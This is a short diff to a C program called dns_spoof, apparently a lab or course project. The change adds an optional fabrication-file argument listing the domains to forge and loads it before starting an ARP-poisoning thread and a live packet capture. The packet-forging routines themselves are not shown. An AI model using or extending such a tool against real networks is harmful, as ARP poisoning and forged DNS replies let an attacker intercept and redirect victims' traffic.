@@ -802,8 +802,8 @@ int main(int argc, char* argv[]) {
     struct in_addr target_ip;
 
     // Get the interface name, target IP address, target_page(liangzk or chanmc) from command line.
-    if (argc != 5) {
-        fprintf(stderr, "usage: <~/path/to/dns_spoof/dns_spoof> <interface> <victim's-ip-address> <target-ip> <domain-name-to-forge>\n");
+    if (argc < 5) {
+        fprintf(stderr, "usage: <~/path/to/dns_spoof/dns_spoof> <interface> <victim's-ip-address> <target-ip> <domain-name-to-forge> <fabrication-file>\n");
         exit(1);
     }
     
@@ -823,6 +823,19 @@ int main(int argc, char* argv[]) {
     if((dns_request_dname = Handle_URL(argv[4])) == NULL) {     // get the domain-to-be-forged, decode it for DNS injection
         printf("Couldn't decode the url of the domain to be forged\n");
         exit(0);
+    }
+
+    char *ft_filename = NULL;
+    if (argc == 6) {
+        ft_filename = argv[5];
+    }
+
+    
+    fill_table(ft_filename);
+
+    for (i = 0; i < num_entries; i++) {
+        printf("item %d:\t%s\n", i, ftable[i].name);
+        //sscanf(line, "%s", ftable[i].name);
     }
 
     // set the attacker's MAC from the terminal
@@ -850,8 +863,7 @@ int main(int argc, char* argv[]) {
 
     pthread_t poison_arp_t;
 
-    char *ft_filename     = NULL;
-    fill_table(ft_filename);
+    
 
     attack.handle = pcap_open_live(if_name, BUFSIZ, 1, -1, pcap_errbuf);
     pthread_create(&poison_arp_t, NULL, (void*)poison_arp, &attack);
